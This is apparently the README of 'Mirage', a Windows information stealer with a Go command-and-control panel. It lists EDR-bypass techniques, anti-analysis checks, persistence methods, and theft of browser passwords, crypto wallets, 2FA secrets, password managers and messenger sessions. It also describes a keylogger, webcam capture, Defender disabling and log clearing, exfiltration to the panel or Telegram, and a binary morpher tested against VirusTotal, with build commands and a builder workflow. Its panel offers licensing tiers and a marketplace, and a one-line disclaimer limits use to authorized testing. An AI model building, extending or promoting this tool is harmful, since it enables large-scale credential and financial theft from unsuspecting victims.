# Mirage 🎭

**Windows x64 information stealer written in Zig with a Go C2 panel.**

Mirage is a modular, comptime-obfuscated infostealer designed for Red Team operations and adversary simulation. The stealer binary (~120 KB, no CRT, no IAT) collects browser credentials, crypto wallets, messengers, gaming sessions, VPN configs, and system information — then exfiltrates via HTTPS to a self-hosted Go panel with Telegram backup.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  Mirage.Stealer (Zig 0.16 + inline ASM)                        │
│  x86_64-windows, ReleaseSmall, single-threaded, 120 KB         │
│                                                                 │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────────────┐  │
│  │ Syscall  │ │ Evasion  │ │ Theft    │ │ Network           │  │
│  │ Engine   │ │ Engine   │ │ Modules  │ │ ZIP → ChaCha20    │  │
│  │ Halo's   │ │ 15 anti- │ │ 68 brows │ │ → TLS → HTTPS     │  │
│  │ Gate     │ │ analysis │ │ 96 wall  │ │ → Panel / TG      │  │
│  │ 30 sysc. │ │ checks   │ │ 18 VPN   │ │ backup            │  │
│  └──────────┘ └──────────┘ └──────────┘ └───────────────────┘  │
└──────────────────────┬──────────────────────────────────────────┘
                       │ HTTPS (multipart/form-data, Bearer token)
┌──────────────────────▼──────────────────────────────────────────┐
│  Mirage.Panel (Go 1.25, chi-router, SQLite/PostgreSQL)          │
│                                                                 │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────────────┐  │
│  │ Dashboard│ │ Sessions │ │ Builder  │ │ Admin             │  │
│  │ Stats,   │ │ Passwords│ │ PE patch │ │ Team, API keys    │  │
│  │ Charts,  │ │ Cookies, │ │ MIRAGECFG│ │ Marketplace,      │  │
│  │ Timeline │ │ Wallets  │ │ + DLL    │ │ Licensing         │  │
│  └──────────┘ └──────────┘ └──────────┘ └───────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Features

### Stealer (Zig)

| Category | Coverage |
|----------|----------|
| **EDR Bypass** | Halo's Gate (30 syscalls), gadget pool (64), stack spoofing, NTDLL unhook, SSN XOR |
| **Anti-Analysis** | 15 weighted checks: RAM, CPU, screen, VM registry, timing, debugger, process list, disk, uptime, mouse, geo-block, hosting IP, HWID ban |
| **Persistence** | 4 methods: Registry Run Key, Task Scheduler, Startup Folder, WMI Event Subscription |
| **Browsers** | **68** (58 Chromium + 10 Gecko), Chrome v20+ App-Bound decryption (COM Elevator + CNG flags) |
| **Wallets** | **134** (96 extension IDs + 38 desktop wallets) |
| **2FA** | **7** authenticators (Google, Microsoft, Authy, Duo, OTP, FreeOTP, Aegis) |
| **Password Managers** | **8** (Bitwarden, Dashlane, Keeper, KeePassXC, LastPass, NordPass, RoboForm, 1Password) |
| **Messengers** | **15** (Discord + billing/gifts, Telegram, Signal, Pidgin, Session, Tox, Skype, Viber, Element, WhatsApp, ICQ, MicroSIP, Jabber, Outlook) |
| **VPN** | **18** (NordVPN, OpenVPN, WireGuard, SurfShark, ExpressVPN, CyberGhost, PIA, Mullvad, Windscribe, TunnelBear, Hotspot Shield, VyprVPN, Hamachi, HideMyName, IpVanish, RadminVPN, SoftEther, ProtonVPN) |
| **Gaming** | **5** (Steam, Uplay, Minecraft + 17 launchers, Battle.net, Roblox) |
| **System** | OS, CPU/GPU/RAM, network, public IP, WiFi passwords, screenshot, file grabber, **seed phrase grabber** (BIP39), **webcam**, **keylogger** (WH_KEYBOARD_LL), clipboard, process list, installed applications |
| **RAT** | SOCKS5 reverse proxy, Chrome Backstage Injection, agent self-update, WASM plugin runtime |
| **Anti-Forensics** | Self-delete (3 levels), temp wipe, hosts file poisoning, Defender disable, event log clear, MIRAGECFG runtime removal |
| **Binary Morphing** | Eidos Morpher — 80-83% build uniqueness (junk code, section rename, fake IAT, entry obfuscation) |

### Panel (Go + React SPA)

| Feature | Status |
|---------|--------|
| JWT auth + RBAC (admin/worker) | ✅ |
| TOTP 2FA | ✅ |
| IP Security Scoring (multi-API) | ✅ |
| WebSocket live updates | ✅ |
| Smart Filters + Advanced Search | ✅ |
| Auto-tagging (DomainDetect) | ✅ |
| Duplicate detection (HWID + IP) | ✅ |
| Multi-bot Telegram (tiered) | ✅ |
| Discord + HTTP webhook notifications | ✅ |
| Marketplace + Module Store | ✅ |
| Licensing (tiers, trial, renewal) | ✅ |
| Team management + session lock | ✅ |
| Cookie Restore (SOCKS5 proxy) | ✅ |
| Public statistics page | ✅ |
| In-panel documentation | ✅ |
| Community chat + support tickets | ✅ |
| API key management (scoped, rate-limited) | ✅ |
| PostgreSQL support (dual provider) | ✅ |

---

## Quick Start

### Requirements

- **Zig 0.16** — build stealer
- **Go 1.25+** — build panel
- **Node.js 22+** — build frontend
- **Python 3.10+** — Eidos Morpher + AV scan

### Build Stealer

```bash
cd Mirage.Stealer
zig build -Dtarget=x86_64-windows
```

### Build Panel

```bash
cd Mirage.Panel/web
npm install
npm run build
cd ..
go build -o bin/panel.exe ./cmd/panel
```

### Run Panel

```bash
cd Mirage.Panel
export PORT=8080
export DB_PATH=data/mirage.db
export JWT_SECRET="change-this-in-production"
export STEALER_EXE_PATH=../Mirage.Stealer/zig-out/bin/Mirage.exe
./bin/panel.exe
```

Open `http://localhost:8080` and log in.

### Build a Custom Stealer Binary

1. Open the panel in your browser
2. Go to **Builder** page
3. Configure C2 host, port, Telegram bot (optional)
4. Click **Build**
5. Download the patched `Mirage.exe`

---

## Project Structure

```
Mirage/
├── Mirage.Stealer/          # Zig stealer (151 files, 24,242 LOC)
│   └── src/
│       ├── main.zig         # Entry point + pipeline
│       ├── config/          # Compile-time config (XOR-encrypted)
│       ├── types/           # PEB, NT types, hash resolution
│       ├── syscalls/        # Halo's Gate, stubs, gadgets, stack spoof
│       ├── evasion/         # Anti-analysis, detection, keylogger
│       ├── crypto/          # AES-GCM, ChaCha20-Poly1305, DPAPI, BCrypt
│       ├── parsers/         # sqLoot (custom SQLite), file_io
│       ├── browsers/        # Chromium (58), Gecko (10), App-Bound
│       ├── wallets/         # 96 extensions + 38 desktop + 2FA + PM
│       ├── messengers/      # Discord, Telegram, Signal, +12 more
│       ├── gaming/          # Steam, Minecraft, Roblox, etc.
│       ├── system/          # OS, hardware, network, webcam, grabber
│       ├── vpn/             # 18 VPN clients
│       ├── network/         # SOCKS5, TLS, HTTP, ZIP
│       ├── inject/          # Chrome Backstage Injection
│       ├── cleanup/         # Self-delete, persistence, global cleanup
│       └── plugins/         # WASM plugin runtime scaffold
├── Mirage.Panel/            # Go panel (93 files, 13,720 LOC)
│   ├── cmd/panel/           # Main entry point
│   ├── internal/
│   │   ├── api/             # HTTP handlers (38 files)
│   │   ├── auth/            # JWT, TOTP
│   │   ├── db/              # SQLite + PostgreSQL, 27 migrations
│   │   ├── middleware/       # Rate limiting, auth, RBAC, IP scoring
│   │   ├── services/        # Build, log processing, proxy, licensing
│   │   └── ws/              # WebSocket hub (live updates, chat)
│   └── web/                 # React SPA (Vite, Tailwind)
├── scripts/                 # Eidos Morpher, AV scan, build release
│   ├── morpher.py           # PE morphing (80-83% uniqueness)
│   ├── av_scan.py           # VirusTotal scan helper
│   └── build_release.sh     # Full release pipeline
└── docs/                    # Architecture, plans, OPSEC
    ├── ARCHITECTURE.md
    ├── OPSEC.md
    └── plans/               # 18 implementation plans
```

---

## OPSEC

Read [`docs/OPSEC.md`](docs/OPSEC.md) for operational security considerations:

- **Static detection risk**: Very low — no IAT, no CRT, all strings XOR-encrypted at comptime
- **Runtime detection risk**: Low-Moderate — Halo's Gate + gadget pool evades userland hooks
- **Network detection risk**: Low — SChannel TLS blends with OS traffic
- **Memory scanning**: Moderate — heap buffers contain decrypted data during execution

---

## License

For authorized security testing and research only. The authors assume no liability for misuse.

---

*Built with Zig 0.16, Go 1.25, React + Vite, and too much coffee.*
